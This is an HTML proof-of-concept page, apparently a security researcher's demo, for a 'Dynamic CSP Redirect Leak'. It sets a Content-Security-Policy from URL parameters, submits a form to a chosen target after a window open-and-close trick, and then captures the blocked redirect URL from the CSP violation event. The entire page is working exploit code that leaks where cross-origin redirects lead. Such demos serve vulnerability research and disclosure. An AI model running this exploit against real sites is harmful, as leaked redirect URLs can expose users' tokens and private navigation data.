<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>POC - Putra Mahardika</title>
    <script>
        const params = new URLSearchParams(window.location.search);
        const targetUrl = params.get('url');
        const allowedDomain = params.get('domain');
        const metaCSP = document.createElement('meta');
        metaCSP.setAttribute('http-equiv', 'Content-Security-Policy');
        metaCSP.setAttribute('content', `default-src 'self' 'unsafe-inline'; form-action 'self' ${allowedDomain};`);
        document.head.appendChild(metaCSP);
    </script>
</head>

<body>
    <h1>Dynamic CSP Redirect Leak</h1>
    <p>Targeting URL: <strong id="displayUrl"></strong></p>
    <p>Allowed Domain (CSP): <strong id="displayDomain"></strong></p>
    <hr>
    <p>Status: <span id="status" style="font-weight: bold; color: blue;">Waiting for user action...</span></p>
    <form id="autoExploitForm" method="GET"></form>
    <button id="exploitBtn"
        style="padding: 10px 20px; font-size: 16px; font-weight: bold; cursor: pointer;">Exploit</button>
    <div id="log" style="margin-top: 20px; color: red; font-weight: bold;"></div>
    <script>
        document.getElementById('displayUrl').innerText = targetUrl;
        document.getElementById('displayDomain').innerText = allowedDomain;
        const form = document.getElementById('autoExploitForm');
        form.action = targetUrl;
        document.addEventListener('securitypolicyviolation', (e) => {
            document.getElementById('status').innerText = "VIOLATION DETECTED!";
            document.getElementById('status').style.color = "red";
            const props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target'.split(','));
            const resultDiv = document.getElementById('log');
            resultDiv.innerHTML = `
                <pre style="background: #eee; padding: 15px; border: 2px solid red; overflow-x: auto;">${JSON.stringify(e, [...props], 2)}</pre>
            `;

            console.error("Leak detected!", e);
        });
        async function exploit() {
            document.getElementById('status').innerText = "Running exploit...";
            console.log("Triggering form submission with window state confusion...");

            const win = window.open('about:blank');
            try {
                win.close();
            } catch (err) {
                console.log(err);
            } finally {
                form.submit();
            }
        }
        document.getElementById('exploitBtn').addEventListener('click', exploit);
    </script>
</body>

</html>
